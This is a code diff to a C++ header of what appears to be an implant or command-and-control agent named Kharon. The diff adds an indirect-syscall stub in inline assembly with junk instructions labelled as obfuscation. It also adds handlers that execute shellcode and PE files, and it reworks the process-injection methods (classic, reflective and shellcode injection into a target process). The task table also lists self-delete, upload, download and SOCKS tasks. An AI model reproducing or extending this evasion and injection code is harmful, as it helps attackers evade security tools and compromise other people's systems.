@@ -660,7 +660,8 @@ private:
 public:
     Syscall( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    BOOL Enabled = FALSE;
+    BOOL Enabled = KH_INDIRECT_SYSCALL_ENABLED;
+    ESYS_OPT Index;
 
     struct {
         ULONG ssn;
@@ -674,14 +675,43 @@ public:
     ) -> BOOL;
 
     template<typename... Args>
-    __forceinline auto DECLFN Run(
-        _In_ ESYS_OPT Idx,
-        _In_ Args...  args        
+    __attribute__((always_inline)) inline auto DECLFN Run(
+        _In_ Args... args
     ) -> NTSTATUS {
-        asm( "mov r14d, %0" : : "r"( Ext[Idx].ssn ) );
-        asm( "mov r15, %0" : : "r" ( Ext[Idx].Instruction ) );
+        NTSTATUS result;
+        void* ssnPtr = &Ext[Index].ssn;
+        void* instPtr = reinterpret_cast<void*>(Ext[Index].Instruction);
     
-        return ExecSyscall( args... );
+        // Carrega endereços nos registradores
+        asm volatile ("mov %0, %%r14" : : "r"(ssnPtr));
+        asm volatile ("mov %0, %%r15" : : "r"(instPtr));
+    
+        __asm__ __volatile__ (
+            // Ofuscação inicial
+            "xor %%r10, %%r10      \n\t"
+            "mov %%rcx, %%rax      \n\t"
+            "mov %%rax, %%r10      \n\t"
+            
+            // Configuração real
+            "mov (%%r14), %%eax    \n\t"  // Carrega SSN
+            
+            // Mais ofuscação
+            "jmp 1f                \n\t"
+            "xor %%eax, %%eax      \n\t"
+            "xor %%rcx, %%rcx      \n\t"
+            "shl $2, %%r10         \n\t"
+            
+            // Ponto de execução real
+            "1:                    \n\t"
+            "jmp *(%%r15)          \n\t"  // Salto para syscall
+            
+            // Captura resultado (não alcançável diretamente)
+            : "=a" (result)        // NTSTATUS retornado em EAX
+            :                     // Sem inputs explícitos
+            : "memory", "r10", "r14", "r15"
+        );
+    
+        return result;
     }
 };
 
@@ -1247,11 +1277,11 @@ public:
         _In_ PJOBS Job
     ) -> ERROR_CODE;
 
-    auto SleepMask( 
+    auto ExecPE( 
         _In_ PJOBS Job
     ) -> ERROR_CODE;
 
-    auto SleepTime( 
+    auto ExecSc( 
         _In_ PJOBS Job
     ) -> ERROR_CODE;
 
@@ -1286,12 +1316,13 @@ public:
         Mgmt[2].ID = TkProcess,    Mgmt[2].Run = &Task::Process,
         Mgmt[3].ID = TkGetInfo,    Mgmt[3].Run = &Task::Info,
         Mgmt[4].ID = TkSelfDelete, Mgmt[4].Run = &Task::SelfDelete,
-        Mgmt[5].ID = TkInjection,  Mgmt[5].Run = &Task::Injection,
+        Mgmt[5].ID = TkExecSc,     Mgmt[5].Run = &Task::ExecSc,
         Mgmt[6].ID = TkConfig,     Mgmt[6].Run = &Task::Config,
         Mgmt[7].ID = TkDownload,   Mgmt[7].Run = &Task::Download,
         Mgmt[8].ID = TkUpload,     Mgmt[8].Run = &Task::Upload,
         Mgmt[9].ID = TkDotnet,     Mgmt[9].Run = &Task::Dotnet,
         Mgmt[10].ID = TkSocks,     Mgmt[10].Run = &Task::Socks,
+        Mgmt[11].ID = TkExecPE,     Mgmt[11].Run = &Task::ExecPE,
     };
 };
 
@@ -1518,35 +1549,41 @@ public:
     ) -> BOOL;
 };
 
+#define KH_INJ_HIBERNING 0x200
+#define KH_INJ_RUNNING   0x100
+
+typedef struct _INJECTION_NODE {
+    ULONG ID;
+    PVOID Address;
+    ULONG Length;
+    ULONG State;
+    BOOL  Obfuscated;
+    PVOID Output;
+    ULONG OutLength;
+    struct _INJECTION_NODE* Next;
+} INJECTION_NODE, *PINJECTION_NODE;
+
 class Injection {
 private:
     Root::Kharon* Self;
 public:
     Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
+    PINJECTION_NODE Node = nullptr;
+
     struct {
         struct {
-            struct {
-                UINT32 ID;
-                PVOID  Ptr;
-            } Keep[10];
-
             UINT8 TechniqueID;
         } PE;
 
         struct {
-            struct {
-                UINT32 ID;
-                PVOID  Ptr;
-            } Keep[10];
-
             UINT8 TechniqueID;
         } Sc; 
 
         struct {
             BOOL  b;
             ULONG s;
-            PCHAR p;
+            PVOID p;
         } Pipe;
 
         struct {
@@ -1555,35 +1592,31 @@ public:
         } Param;
         
         BOOL  Spawn;
-        BOOL  Syscall;
 
     } Ctx = {
         .PE = { .TechniqueID = KH_INJECTION_PE },
-        .Sc = { .TechniqueID = KH_INJECTION_SC },
-        .Syscall = KH_INDIRECT_SYSCALL_ENABLED
+        .Sc = { .TechniqueID = KH_INJECTION_SC }
     };
 
     auto Shellcode(
+        _In_ ULONG ProcessID,
         _In_ PBYTE Buffer,
-        _In_ UPTR  Size
+        _In_ UPTR  Size,
+        _In_ PVOID Param
     ) -> BOOL;
 
     auto Classic(
-        _In_      PBYTE   Buffer,
-        _In_      UPTR    Size,
-        _In_      PVOID   Param,
-        _Out_     PVOID*  Base,
-        _Out_     HANDLE* TdHandle,
-        _Out_     PULONG  TdID,
-        _Out_opt_ PBYTE*  OutBuff,
-        _Out_opt_ ULONG*  OutLen
+        _In_  ULONG   ProcessID,
+        _In_  PBYTE   Buffer,
+        _In_  UPTR    Size,
+        _In_  PVOID   Param,
+        _Out_ PVOID*  Base
     ) -> BOOL;
 
     auto Reflection(
         _In_ PBYTE  Buffer,
         _In_ ULONG  Size,
-        _In_ PVOID  Param,
-        _In_ PBYTE* OutBuff
+        _In_ PVOID  Param
     ) -> BOOL;
 };
 
